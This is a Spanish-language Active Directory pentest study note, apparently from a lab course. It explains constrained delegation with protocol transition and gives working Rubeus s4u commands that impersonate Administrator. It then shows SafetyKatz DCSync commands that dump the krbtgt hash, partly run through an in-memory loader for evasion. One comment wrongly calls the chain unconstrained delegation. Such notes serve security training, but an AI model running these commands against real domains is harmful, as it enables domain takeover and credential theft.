# Constrained Delegation with Protocol Transition 

Tags: #AD #Constrained_Delegation 

- Permite el acceso únicamente a servicios específicos en computadoras específicas, actuando como un usuario.
- La **transición de protocolo (Protocol Transition)** se utiliza cuando un usuario se autentica en un servicio web sin usar Kerberos, y el servicio web realiza solicitudes a un servidor de base de datos para obtener resultados basados en la autorización del usuario.

Para suplantar a un usuario, se utiliza la extensión **Service for User (S4U)**, la cual proporciona dos extensiones:

- **Service for User to Self (S4U2self)**  
    Permite a un servicio obtener un **TGS reenviable hacia sí mismo** en nombre de un usuario, utilizando únicamente el nombre principal del usuario (**UPN**), **sin necesidad de proporcionar una contraseña**.
- **Service for User to Proxy (S4U2proxy)**  
    Permite a un servicio obtener un **TGS hacia un segundo servicio** en nombre de un usuario.  
    ¿Qué segundo servicio? Esto está controlado por el atributo **msDS-AllowedToDelegateTo**.  
    Este atributo contiene una lista de **SPNs** a los cuales los tokens del usuario pueden ser reenviados.

```powershell 
! Usuario: Usuario de dominio

❯ Get-DomainUser -TrustedToAuth
# Enumerar usuarios con Constrained Delegation habilitada usando PowerView — muestra los SPNs a los que pueden delegar.

❯ Get-DomainComputer -TrustedToAuth
# Enumerar equipos con Constrained Delegation habilitada usando PowerView.

❯ Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
# Enumerar usuarios y equipos con Constrained Delegation usando el módulo ActiveDirectory nativo — muestra el atributo msDS-AllowedToDelegateTo con los servicios permitidos.
```

```powershell 
! Usuario: Usuario de dominio con Constrained Delegation habilitada (cuenta de servicio comprometida)

Ejemplo 1:
❯ Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.domain1.local /ptt

❯ .\Loader.exe -path C:\AD\Rubeus.exe -args s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.domain1.local /ptt
# Solicitar TGT y TGS en un solo comando abusando de Constrained Delegation (S4U2Self + S4U2Proxy) — impersona al Administrator para acceder al servicio CIFS del servidor MSSQL e inyecta el ticket en la sesión actual. 

❯ klist  # Mirar los tickets de la sesión actual 

❯ ls \\dcorp-mssql.domain1.local\c$
❯ dir \\dcorp-mssql.domain1.local\c$
# Verificar acceso al recurso compartido C$ del servidor MSSQL usando el ticket inyectado.
```

```powershell 
! Usuario: Administrador local del servidor con Constrained Delegation habilitada

Ejemplo 2:
❯ .\Loader.exe -path C:\AD\Rubeus.exe -args s4u /user:dcorp-adminsrv$ /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.domain1.local /altservice:ldap /ptt
# Cargar Rubeus en memoria vía Loader.exe y abusar de Constrained Delegation usando /altservice:ldap para reescribir el SPN del ticket a LDAP — permite ejecutar DCSync contra el DC impersonando al Administrator.

NOTA: Si existen múltiples entradas para el mismo username, usar el AES256 correspondiente al SID S-1-5-18 (SYSTEM) ya que es la cuenta de máquina real, no una sesión de usuario.

❯ klist  # Mirar los tickets de la sesión actual 

❯ SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt"
❯ .\Loader.exe -path C:\AD\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
# Ejecutar DCSync con el TGT del DC inyectado para volcar el hash de krbtgt — completa la cadena de Unconstrained Delegation → captura de TGT → DCSync.
```

![](Pasted%20image%2020260421163357.png)